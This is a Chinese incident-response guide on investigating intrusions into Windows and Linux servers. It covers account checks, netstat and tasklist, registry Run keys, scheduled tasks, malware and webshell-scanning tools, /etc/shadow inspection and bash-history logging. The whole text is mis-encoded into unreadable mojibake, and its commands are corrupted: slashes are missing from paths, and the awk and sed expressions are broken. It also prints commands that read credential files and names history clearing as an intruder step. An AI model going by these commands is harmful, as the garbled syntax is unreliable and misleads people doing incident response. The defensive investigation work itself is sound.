æŸ¥çœ‹è¿›ç¨‹æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯è¿›ç¨‹åŠ è½½çš„dllæ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸€ä¸ªdllæ–‡ä»¶æ²¡æœ‰ç­¾åï¼Œè¿™å°±æ˜¯é‚£ä¸ªæœ¨é©¬ç¨‹åºçš„ä¸»ç¨‹åºæ–‡ä»¶ï¼Œå®ƒæ˜¯ä»¥é©±åŠ¨æ–‡ä»¶çš„å½¢å¼ æŒ‚åœ¨åˆ°äº†svchost.exeè¿™ä¸ªç³»ç»Ÿä¸»ç¨‹åºä¸Šã€‚ 4. åˆ é™¤dllæ–‡ä»¶ 5. ç»“æŸè¿™ä¸ªå¼‚å¸¸çš„svchostè¿›ç¨‹ 6. åˆ é™¤å¼‚å¸¸æœåŠ¡å’Œæ³¨å†Œè¡¨ä¿¡æ¯ 7. æŸ¥çœ‹å¯åŠ¨é¡¹ï¼Œæ— å¼‚å¸¸ 8. æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼Œæ— å¼‚å¸¸ 9. æŸ¥çœ‹ç”¨æˆ·æ²¡æœ‰å¼‚å¸¸ 10. è¿œç¨‹è¿æ¥æ²¡æœ‰å¼€æ”¾ 3-16 åº”æ€¥å“åº”åº”æ€¥å“åº”æµç¨‹ã€‚ æ£€æŸ¥å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹ä¿¡æ¯ã€è¿›ç¨‹è¿æ¥æƒ…å†µã€å¼‚å¸¸è¿æ¥è¿›ç¨‹çš„è¿è¡Œç¨‹åºæ–‡ä»¶ æŸ¥çœ‹å¯ç–‘è¿›ç¨‹ æ‰¾åˆ°å¯¹åº”ç¨‹åºæ–‡ä»¶ æ’æŸ¥æ–‡ä»¶å†…å®¹ å¹²æ‰æ–‡ä»¶ã€æ€æ‰è¿›ç¨‹ 2. å…¥ä¾µæ’æŸ¥æ€è·¯ 1ã€æŸ¥çœ‹è´¦æˆ·ä¿¡æ¯ï¼šå¯ç–‘è´¦æˆ· æ‰‹å·¥æ–¹å¼å’Œå·¥å…·(Dç›¾ã€æ²³é©¬) æ‰‹å·¥ï¼šæ³¨å†Œè¡¨ã€net userã€ç®¡ç†ç•Œé¢æŸ¥çœ‹ç”¨æˆ·ã€æŸ¥çœ‹ç”¨æˆ·çš„å±ç»„æƒ…å†µ 2ã€ç»“åˆæ—¥å¿—(ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—(æ–°å»ºã€ç™»å½•ã€æ³¨é”€ã€é€€å‡ºç­‰åŠ¨ä½œçš„æ—¥å¿—))ï¼ŒæŸ¥çœ‹ç®¡ç†å‘˜ç™»å½•æ—¶é—´ã€ç”¨æˆ·åæ˜¯å¦å­˜åœ¨å¼‚å¸¸ å¦‚æœæœåŠ¡å™¨æˆ–è€…ç”µè„‘å¯¹å¤–æä¾›äº†webæœåŠ¡ï¼Œä¹Ÿå°±æ˜¯æœ‰webé¡¹ç›®ï¼Œé‚£ä¹ˆé‡ç‚¹è¿˜è¦åˆ†æä¸€ä¸‹webæ—¥å¿—è®°å½• 4ã€æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æœ‰å¼‚å¸¸çš„å¯åŠ¨é¡¹(æ³¨å†Œè¡¨ã€å¯åŠ¨é¡¹æ–‡ä»¶å­˜æ”¾ä½ç½®ã€ç»„ç­–ç•¥ç­‰ç­‰) 5ã€æ£€æŸ¥è®¡åˆ’ä»»åŠ¡(å®šæ—¶ä»»åŠ¡) 6ã€æœåŠ¡è‡ªå¯åŠ¨ æº¯æºï¼š 7ã€æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼š a. æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ä»¥åŠè¡¥ä¸ä¿¡æ¯ b. æŸ¥æ‰¾å¯ç–‘ç›®å½•åŠæ–‡ä»¶(æŒ‰ç…§æ—¶é—´æ’åºã€åˆ†ææœ€è¿‘æ‰“å¼€åˆ†æå¯ç–‘æ–‡ä»¶) 3-16 Windowså…¥ä¾µæ’æŸ¥æ€è·¯3-16-1 æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨ 1ã€æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦æœ‰å¼±å£ä»¤ï¼Œè¿œç¨‹ç®¡ç†ç«¯å£æ˜¯å¦å¯¹å…¬ç½‘å¼€æ”¾ã€‚ ## æ£€æŸ¥æ–¹æ³•ï¼šæ®å®é™…æƒ…å†µå’¨è¯¢ç›¸å…³æœåŠ¡å™¨ç®¡ç†å‘˜ã€‚(æˆ–è€…ç”¨æ‰«æå™¨æ‰«æ) ## æˆ‘ä»¬ä¹Ÿéœ€è¦æŠŠä¿¡æ¯æ”¶é›†èµ·æ¥ï¼Œæ¯”å¦‚ç«¯å£ä¿¡æ¯ 2,æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨å¯ç–‘è´¦å·ã€æ–°å¢è´¦å·ã€‚ a.æ£€æŸ¥æ˜¯å¦æœ‰å¤šä½™è´¦æˆ·ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡ä»¤æ¥æŸ¥çœ‹ net user b.æ£€æŸ¥guestè´¦æˆ·æƒé™ c.å±ç»„æƒé™ 3ã€æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨éšè—è´¦å·ã€å…‹éš†è´¦å·ã€‚å°±æ˜¯åœ¨ç®¡ç†é‡Œé¢æˆ–è€…é€šè¿‡cmdï¼Œéƒ½ä¸èƒ½çœ‹åˆ°çš„ç”¨æˆ·æ£€æŸ¥æ–¹æ³•ï¼š regedit aã€æ‰“å¼€æ³¨å†Œè¡¨ ï¼ŒæŸ¥çœ‹ç®¡ç†å‘˜å¯¹åº”é”®å€¼ã€‚ æ‰¾åˆ°SAMï¼š è®¾ç½®SAMæƒé™ åˆ·æ–°ï¼š å°±å¯ä»¥å±•å¼€äº†ï¼Œç„¶åæ‰¾åˆ°Namesï¼Œè¿™æ˜¯æ‰€æœ‰ç”¨æˆ·åï¼Œä¸ç®¡æ˜¯ä¸æ˜¯éšè—çš„ï¼Œè¿™é‡Œæ˜¯éƒ½å¯ä»¥çœ‹åˆ°çš„ bã€ä½¿ç”¨Dç›¾_webæŸ¥æ€å·¥å…·ï¼Œä¹Ÿå¯ä»¥æ€webæœ¨é©¬ï¼Œé›†æˆäº†å¯¹å…‹éš†è´¦å·æ£€æµ‹çš„åŠŸèƒ½ã€‚å‚è€ƒæ–‡æ¡£ï¼šhttps://www.linktrust.net/tools/163.html 4ã€ç»“åˆæ—¥å¿—ï¼ŒæŸ¥çœ‹ç®¡ç†å‘˜ç™»å½•æ—¶é—´ã€ç”¨æˆ·åæ˜¯å¦å­˜åœ¨å¼‚å¸¸ã€‚ aã€Win+Ræ‰“å¼€è¿è¡Œï¼Œè¾“å…¥â€œeventvwr.mscâ€ï¼Œå›è½¦è¿è¡Œï¼Œæ‰“å¼€â€œäº‹ä»¶æŸ¥çœ‹å™¨â€,è¿™æ˜¯æ“ä½œç³»ç»Ÿæ—¥å¿—ã€‚ bã€å¯¼å‡ºWindowsæ—¥å¿—â€“å®‰å…¨ï¼Œåˆ©ç”¨Log Parserè¿›è¡Œåˆ†æã€‚è¿™ä¸ªå…ˆä¸æäº†ã€‚ 3-16-2 æ£€æŸ¥å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹1ã€æ£€æŸ¥ç«¯å£è¿æ¥æƒ…å†µï¼Œæ˜¯å¦æœ‰è¿œç¨‹è¿æ¥ã€å¯ç–‘è¿æ¥ã€‚ æ£€æŸ¥æ–¹æ³•ï¼š aã€netstat -ano æŸ¥çœ‹ç›®å‰çš„ç½‘ç»œè¿æ¥ï¼Œå®šä½å¯ç–‘çš„ESTABLISHED bã€æ ¹æ®netstat å®šä½å‡ºçš„pidï¼Œå†é€šè¿‡tasklistå‘½ä»¤è¿›è¡Œè¿›ç¨‹å®šä½ tasklist | findstr â€œPIDâ€ c.ç„¶åå¯ä»¥å»ç£ç›˜ä¸Šæœç´¢è¿™ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚æˆ‘æœç´¢BaiduProtect.exe 2ã€è¿›ç¨‹ æ£€æŸ¥æ–¹æ³•ï¼š aã€å¼€å§‹â€“è¿è¡Œâ€“è¾“å…¥msinfo32ï¼Œä¾æ¬¡ç‚¹å‡»â€œè½¯ä»¶ç¯å¢ƒâ†’æ­£åœ¨è¿è¡Œä»»åŠ¡â€å°±å¯ä»¥æŸ¥çœ‹åˆ°è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚è¿›ç¨‹è·¯å¾„ã€è¿›ç¨‹IDã€æ–‡ä»¶åˆ›å»ºæ—¥æœŸã€å¯åŠ¨æ—¶é—´ã€CPUã€å†…å­˜ç­‰ã€‚ä¸€èˆ¬CPUå ç”¨æ¯”è¾ƒå¤§çš„ï¼Œå¯èƒ½æœ‰é—®é¢˜ bã€æ‰“å¼€Dç›¾_webæŸ¥æ€å·¥å…·ï¼Œè¿›ç¨‹æŸ¥çœ‹ï¼Œå…³æ³¨æ²¡æœ‰ç­¾åä¿¡æ¯(å¾®è½¯çš„ç­¾åï¼Œä¹Ÿå°±æ˜¯å¾®è½¯ä¿¡ä»»çš„ç¨‹åº)çš„è¿›ç¨‹ã€‚ cã€é€šè¿‡å¾®è½¯å®˜æ–¹æä¾›çš„ Process Explorer ç­‰å·¥å…·è¿›è¡Œæ’æŸ¥ ã€‚ dã€æŸ¥çœ‹å¯ç–‘çš„è¿›ç¨‹åŠå…¶å­è¿›ç¨‹ã€‚å¯ä»¥é€šè¿‡è§‚å¯Ÿä»¥ä¸‹å†…å®¹ï¼šæ‰‹å·¥æŸ¥æ€éš¾åº¦æ¯”è¾ƒå¤§ï¼Œä¸€èˆ¬éƒ½æ˜¯é…åˆå·¥å…·æ¥åšï¼Œæ¯”å¦‚ç«ç»’å‰‘ã€‚ æ²¡æœ‰ç­¾åéªŒè¯ä¿¡æ¯çš„è¿›ç¨‹ æ²¡æœ‰æè¿°ä¿¡æ¯çš„è¿›ç¨‹ è¿›ç¨‹çš„å±ä¸» è¿›ç¨‹çš„è·¯å¾„æ˜¯å¦åˆæ³• CPUæˆ–å†…å­˜èµ„æºå ç”¨é•¿æ—¶é—´è¿‡é«˜çš„è¿›ç¨‹ 3ã€å°æŠ€å·§ï¼š aã€æŸ¥çœ‹ç«¯å£å¯¹åº”çš„PIDï¼š netstat -ano | findstr â€œportâ€ bã€æŸ¥çœ‹è¿›ç¨‹å¯¹åº”çš„PIDï¼šä»»åŠ¡ç®¡ç†å™¨â€“æŸ¥çœ‹â€“é€‰æ‹©åˆ—â€“PID æˆ–è€… tasklist | findstr â€œPIDâ€ cã€æŸ¥çœ‹è¿›ç¨‹å¯¹åº”çš„ç¨‹åºä½ç½®ï¼š ä»»åŠ¡ç®¡ç†å™¨â€“é€‰æ‹©å¯¹åº”è¿›ç¨‹â€“å³é”®æ‰“å¼€æ–‡ä»¶ä½ç½® è¿è¡Œè¾“å…¥ wmicï¼Œcmdç•Œé¢ è¾“å…¥ process dã€tasklist svc è¿›ç¨‹â€“PIDâ€“æœåŠ¡ eã€æŸ¥çœ‹WindowsæœåŠ¡æ‰€å¯¹åº”çš„ç«¯å£ï¼š %system%system32driversetcservicesï¼ˆä¸€èˆ¬%system%å°±æ˜¯C:\\Windowsï¼‰ 3-16-3 æ£€æŸ¥å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡1ã€æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æœ‰å¼‚å¸¸çš„å¯åŠ¨é¡¹ã€‚å› ä¸ºæœ‰äº›æœ¨é©¬éƒ½æ˜¯å¼€å¯è‡ªå¯åŠ¨çš„ï¼Œä¸ç„¶ä¸‹æ¬¡å¼€æœºä»–å°±æ²¡ç”¨äº†ã€‚ æ£€æŸ¥æ–¹æ³•ï¼š ## aã€ç™»å½•æœåŠ¡å™¨ï¼Œå•å‡»ã€å¼€å§‹ã€‘ã€æ‰€æœ‰ç¨‹åºã€‘ã€å¯åŠ¨ã€‘ï¼Œé»˜è®¤æƒ…å†µä¸‹æ­¤ç›®å½•åœ¨æ˜¯ä¸€ä¸ªç©ºç›®å½•ï¼Œç¡®è®¤æ˜¯å¦æœ‰éä¸šåŠ¡ç¨‹åºåœ¨è¯¥ç›®å½•ä¸‹ã€‚ ## bã€å•å‡»å¼€å§‹èœå• ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ msconfigï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œæ˜¯åˆ™å–æ¶ˆå‹¾é€‰å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œå¹¶åˆ°å‘½ä»¤ä¸­æ˜¾ç¤ºçš„è·¯å¾„åˆ é™¤æ–‡ä»¶ã€‚ ## cã€å•å‡»ã€å¼€å§‹ã€‘ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ regeditï¼Œæ‰“å¼€æ³¨å†Œè¡¨ï¼ŒæŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹æ˜¯å¦æ­£å¸¸ï¼Œç‰¹åˆ«æ³¨æ„å¦‚ä¸‹ä¸‰ä¸ªæ³¨å†Œè¡¨é¡¹ï¼š HKEY_CURRENT_USER\\software\\micorsoft\\windows\\currentversion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce æ£€æŸ¥å³ä¾§æ˜¯å¦æœ‰ ## å¯åŠ¨å¼‚å¸¸çš„é¡¹ç›®ï¼Œå¦‚æœ‰è¯·åˆ é™¤ï¼Œå¹¶å»ºè®®å®‰è£…æ€æ¯’è½¯ä»¶è¿›è¡Œç—…æ¯’æŸ¥æ€ï¼Œæ¸…é™¤æ®‹ç•™ç—…æ¯’æˆ–æœ¨é©¬ã€‚ ## dã€åˆ©ç”¨å®‰å…¨è½¯ä»¶æŸ¥çœ‹å¯åŠ¨é¡¹ã€å¼€æœºæ—¶é—´ç®¡ç†ç­‰ã€‚ ## eã€ç»„ç­–ç•¥ï¼Œè¿è¡Œgpedit.mscã€‚ 2ã€æ£€æŸ¥è®¡åˆ’ä»»åŠ¡ æ£€æŸ¥æ–¹æ³•ï¼š ## aã€å•å‡»ã€å¼€å§‹ã€‘ã€è®¾ç½®ã€‘ã€æ§åˆ¶é¢æ¿ã€‘ã€ä»»åŠ¡è®¡åˆ’ã€‘ï¼ŒæŸ¥çœ‹è®¡åˆ’ä»»åŠ¡å±æ€§ï¼Œä¾¿å¯ä»¥å‘ç°æœ¨é©¬æ–‡ä»¶çš„è·¯å¾„ã€‚å¥½å¤šæœ¨é©¬éƒ½æ˜¯åœ¨åŠå¤œå·å·å¯åŠ¨ã€‚ ## bã€å•å‡»ã€å¼€å§‹ã€‘ã€è¿è¡Œã€‘ï¼›è¾“å…¥ cmdï¼Œç„¶åè¾“å…¥atï¼Œæ£€æŸ¥è®¡ç®—æœºä¸ç½‘ç»œä¸Šçš„å…¶å®ƒè®¡ç®—æœºä¹‹é—´çš„ä¼šè¯æˆ–è®¡åˆ’ä»»åŠ¡ï¼Œå¦‚æœ‰ï¼Œåˆ™ç¡®è®¤æ˜¯å¦ä¸ºæ­£å¸¸è¿æ¥ã€‚è¿™ä¸ªå°±ä¸çœ‹äº†ã€‚ 3ã€æœåŠ¡è‡ªå¯åŠ¨ æ£€æŸ¥æ–¹æ³•ï¼š ## å•å‡»ã€å¼€å§‹ã€‘ã€è¿è¡Œã€‘ï¼Œè¾“å…¥services.mscï¼Œæ³¨æ„æœåŠ¡çŠ¶æ€å’Œå¯åŠ¨ç±»å‹ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸æœåŠ¡ã€‚æœ‰æ—¶å€™æœ¨é©¬ä¼šä»¥æœåŠ¡çš„æ–¹å¼æ¥å¯åŠ¨ã€‚ 3-16-4 æ£€æŸ¥ç³»ç»Ÿç›¸å…³ä¿¡æ¯1ã€æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ä»¥åŠè¡¥ä¸ä¿¡æ¯ ## æ£€æŸ¥æ–¹æ³•ï¼šå•å‡»ã€å¼€å§‹ã€‘ã€è¿è¡Œã€‘ï¼Œè¾“å…¥systeminfoï¼ŒæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯ç­‰ å…¶å®å¾®è½¯çš„è¡¥ä¸æ¯”è¾ƒå¥½æ‰“ï¼Œå¼€å¯è‡ªåŠ¨æ›´æ–°ï¼Œå®ƒå°±è‡ªå·±æ‰“äº†ï¼Œå¦‚æœä¸ä¼šï¼Œé‚£ä¹ˆå°±ç”¨360å®‰å…¨å«å£«æ¥æ‰“è¡¥ä¸ï¼Œæ–¹æ³•å¾ˆå¤šæ˜‚ã€‚ 2ã€æŸ¥æ‰¾å¯ç–‘ç›®å½•åŠæ–‡ä»¶ æ£€æŸ¥æ–¹æ³•ï¼š ## aã€ æŸ¥çœ‹ç”¨æˆ·ç›®å½•ï¼Œæ–°å»ºè´¦å·ä¼šåœ¨è¿™ä¸ªç›®å½•ç”Ÿæˆä¸€ä¸ªç”¨æˆ·ç›®å½•ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ–°å»ºç”¨æˆ·ç›®å½•ã€‚å¯ä»¥æŸ¥çœ‹æ—¶é—´ Window 2003 C:\\Documents and Settingsï¼Œæ¯åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œç³»ç»Ÿåœ¨è¿™é‡Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”åç§°çš„æ–‡ä»¶å¤¹ï¼Œè‡ªåŠ¨è®°å½•ä¸€äº›ä¿¡æ¯ã€‚ Window 2008R2 C:\\Users\\ bã€å•å‡»ã€å¼€å§‹ã€‘ã€è¿è¡Œã€‘ï¼Œè¾“å…¥%UserProfile%\\Recentï¼Œåˆ†ææœ€è¿‘æ‰“å¼€åˆ†æå¯ç–‘æ–‡ä»¶ã€‚ cã€åœ¨æœåŠ¡å™¨å„ä¸ªç›®å½•ï¼Œå¯æ ¹æ®æ–‡ä»¶å¤¹å†…æ–‡ä»¶åˆ—è¡¨æ—¶é—´è¿›è¡Œæ’åºï¼ŒæŸ¥æ‰¾å¯ç–‘æ–‡ä»¶ã€‚ 3-17 ç—…æ¯’å¤„ç†å·¥å…·3-17-1 ç—…æ¯’åˆ†æPCHunterï¼šhttp://www.xuetr.com ç«ç»’å‰‘ï¼šhttps://www.huorong.cn Process Explorerï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhackerï¼šhttps://processhacker.sourceforge.io/downloads.php autorunsï¼šhttps://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTLï¼šhttps://www.bleepingcomputer.com/download/otl/ 3-17-2 ç—…æ¯’æŸ¥æ€å¡å·´æ–¯åŸºï¼šhttp://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe ï¼ˆæ¨èç†ç”±ï¼šç»¿è‰²ç‰ˆã€æœ€æ–°ç—…æ¯’åº“ï¼‰ å¤§èœ˜è››ï¼šhttp://free.drweb.ru/download+cureit+free ï¼ˆæ¨èç†ç”±ï¼šæ‰«æå¿«ã€ä¸€æ¬¡ä¸‹è½½åªèƒ½ç”¨1å‘¨ï¼Œæ›´æ–°ç—…æ¯’åº“ï¼‰ ç«ç»’å®‰å…¨è½¯ä»¶ï¼šhttps://www.huorong.cn 360æ€æ¯’ï¼šhttp://sd.360.cn/download_center.html 3-17-3 ç—…æ¯’åŠ¨æ€CVERC-å›½å®¶è®¡ç®—æœºç—…æ¯’åº”æ€¥å¤„ç†ä¸­å¿ƒï¼šhttp://www.cverc.org.cn å¾®æ­¥åœ¨çº¿å¨èƒæƒ…æŠ¥ç¤¾åŒºï¼šhttps://x.threatbook.cn ç«ç»’å®‰å…¨è®ºå›ï¼šhttp://bbs.huorong.cn/forum-59-1.html çˆ±æ¯’éœ¸ç¤¾åŒºï¼šhttp://bbs.duba.net è…¾è®¯ç”µè„‘ç®¡å®¶ï¼šhttp://bbs.guanjia.qq.com/forum-2-1.html 3-17-4 åœ¨çº¿ç—…æ¯’æ‰«æç½‘ç«™http://www.virscan.org å¤šå¼•æ“åœ¨çº¿ç—…æ¯’æ‰«æç½‘ v1.02ï¼Œå½“å‰æ”¯æŒ 41 æ¬¾æ€æ¯’å¼•æ“ https://habo.qq.com è…¾è®¯å“ˆå‹ƒåˆ†æç³»ç»Ÿ https://virusscan.jotti.org Jottiæ¶æ„è½¯ä»¶æ‰«æç³»ç»Ÿ http://www.scanvir.com é’ˆå¯¹è®¡ç®—æœºç—…æ¯’ã€æ‰‹æœºç—…æ¯’ã€å¯ç–‘æ–‡ä»¶ç­‰è¿›è¡Œæ£€æµ‹åˆ†æ 3-17-5 webshellæŸ¥æ€Dç›¾_WebæŸ¥æ€ï¼šhttp://www.d99net.net/index.asp æ²³é©¬webshellæŸ¥æ€ï¼šhttp://www.shellpub.com æ·±ä¿¡æœWebshellç½‘ç«™åé—¨æ£€æµ‹å·¥å…·ï¼šhttp://edr.sangfor.com.cn/backdoor_detection.html Safe3ï¼šhttp://www.uusec.com/webshell.zip 3-18 linux å…¥ä¾µæ’æŸ¥3-18-1 è´¦å·å®‰å…¨1ã€ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶ cat etcpasswd ï¼Œå¦‚æœé‡Œé¢å†…å®¹æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬ä½¿ç”¨ more etcpasswd 2ã€å½±å­æ–‡ä»¶ cat etcshadow ï¼Œè¿™æ˜¯ä¸ªå­˜å¯†ç çš„æ–‡ä»¶ root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI:16809:0:99999:7::: ## ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸçš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™æ²¡æœ‰å¯†ç çš„ç”¨æˆ·å°±çœ‹ä¸åˆ°è¿™ä¹ˆä¸€å¤§ä¸²å­—ç¬¦äº†ï¼š $6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI ## ä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼š0è¡¨ç¤ºæ²¡æœ‰ä¿®æ”¹è¿‡ ## å¯†ç æœ‰æ•ˆæœŸï¼š99999è¡¨ç¤ºæ°¸ä¸è¿‡æœŸ ## #å¯†ç ä¿®æ”¹åˆ°æœŸçš„è­¦å‘Šå¤©æ•°ï¼š7è¡¨ç¤º7å¤©å†…éƒ½ä¼šæé†’ä½  æ³¨ï¼šlinuxçš„å¯†ç æ˜¯åŒå±‚åŠ å¯†çš„(åŠ å¯†å’ŒåŠ ç›)ï¼Œä¸å®¹æ˜“ç ´è§£ who æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç™»é™† ,ptsè¿œç¨‹ç™»å½•ï¼Œæ¯”å¦‚ç”¨xshellè¿™ç§å·¥å…·è¿æ¥ç™»å½•ä¸Šå»çš„ w æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸º uptime æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½ å…¥ä¾µæ’æŸ¥ 1ã€æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0) [root@localhost ~]# awk -F: â€˜$30{print $1}â€™ etcpasswd 2ã€æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯ [root@localhost ~]# awk â€˜$1|$6{print $1}â€™ etcshadow 3ã€é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™ [root@localhost ~]# more etcsudoers | grep -v â€œ^#|^$â€ | grep â€œALL(ALL)â€ 4ã€ç¦ç”¨æˆ–åˆ é™¤å¤šä½™åŠå¯ç–‘çš„å¸å· usermod -L user ## ç¦ç”¨å¸å·ï¼Œå¸å·æ— æ³•ç™»å½•ï¼Œetcshadowç¬¬äºŒæ ä¸º!å¼€å¤´ userè¡¨ç¤ºä½ æŸ¥åˆ°çš„ç”¨æˆ·å userdel user ## åˆ é™¤userç”¨æˆ· userdel -r user ## å°†åˆ é™¤userç”¨æˆ·ï¼Œå¹¶ä¸”å°†homeç›®å½•ä¸‹çš„userç›®å½•ä¸€å¹¶åˆ é™¤ï¼Œæœ‰äº›äººå…¥ä¾µå®Œæˆåˆ é™¤è‡ªå·±ç”¨æˆ·çš„æ—¶å€™ï¼Œå¯èƒ½å¿˜è®°äº†åŠ -rï¼Œé‚£ä¹ˆåœ¨homeç›®å½•ä¸‹æ˜¯æœ‰å®ƒç”¨æˆ·åçš„æ–‡ä»¶å¤¹çš„ï¼Œä¹Ÿå°±æ˜¯å­˜æœ‰ç›¸å…³ä¿¡æ¯ã€‚ 3-18-2 å†å²å‘½ä»¤é€šè¿‡ .bash_history æŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤ 1ã€rootçš„å†å²å‘½ä»¤ history 2ã€æ‰“å¼€homeå„å¸å·ç›®å½•ä¸‹çš„ .bash_history ï¼ŒæŸ¥çœ‹æ™®é€šå¸å·çš„å†å²å‘½ä»¤,ä¸ºå†å²çš„å‘½ä»¤å¢åŠ ç™»å½•çš„IPåœ°å€ã€æ‰§è¡Œå‘½ä»¤æ—¶é—´ç­‰ä¿¡æ¯ï¼š 1ï¼‰ä¿å­˜1ä¸‡æ¡å‘½ä»¤ï¼Œé»˜è®¤åªä¿å­˜1000æ¡ sed -i â€˜s^HISTSIZE1000HISTSIZE10000gâ€™ etcprofile 2ï¼‰åœ¨ etcprofile çš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ï¼š ######jiagu history xianshi######### USER_IPwho -u am i 2/dev/null | awk {print $NF} | sed -e s/[()]//g if [ â€œ$USER_IPâ€ â€œâ€ ] then USER_IPhostname fi export HISTTIMEFORMATâ€%F %T $USER_IP whoami â€œ shopt -s histappend export PROMPT_COMMANDâ€history -aâ€ ######### jiagu history xianshi ########## 3), source etcprofile è®©é…ç½®ç”Ÿæ•ˆ ## å†æ‰§è¡ŒhistoryæŒ‡ä»¤ï¼Œç”Ÿæˆæ•ˆæœï¼š 1 2018-07-10 19:45:39 192.168.204.1 root source etcprofile ç¬¬ä¸€æ¡è®°å½• ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ å“ªä¸ªipåœ°å€è¿‡æ¥æ‰§è¡Œçš„ ç”¨çš„å“ªä¸ªç”¨æˆ· æ‰§è¡Œçš„ä»€ä¹ˆæŒ‡ä»¤ 3ã€å†å²æ“ä½œå‘½ä»¤çš„æ¸…é™¤ï¼š history -c ## ä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ é™¤ .bash_profile æ–‡ä»¶ä¸­çš„è®°å½•ã€‚å…¥ä¾µè€…å¦‚æœèƒ½åŠ›æ¯”è¾ƒå¼ºçš„ï¼Œä¹Ÿä¼šæŠŠè¿™ä¸ªæ–‡ä»¶æƒ…å†µã€‚ 3-18-3 ç«¯å£ä½¿ç”¨netstat ç½‘ç»œè¿æ¥å‘½ä»¤ï¼Œåˆ†æå¯ç–‘ç«¯å£ã€IPã€PID netstat -antlp|more æŸ¥çœ‹ä¸‹pidæ‰€å¯¹åº”çš„è¿›ç¨‹æ–‡ä»¶è·¯å¾„ï¼Œ è¿è¡Œls -l proc$PIDexeæˆ–file proc$PIDexeï¼ˆ$PID ä¸ºå¯¹åº”çš„pid å·ï¼‰ 3-18-4 è¿›ç¨‹ä½¿ç”¨pså‘½ä»¤ï¼Œåˆ†æè¿›ç¨‹ ps aux | grep pid 3-18-65å¼€æœºå¯åŠ¨é¡¹ etcinittab ## æŸ¥çœ‹ç³»ç»Ÿçš„è¿è¡Œçº§åˆ« etcrc.local etcrc.drc[06].d ## å„è¿è¡Œçº§åˆ«ä¸‹çš„è‡ªå¯åŠ¨æ–‡ä»¶ 3-18-6 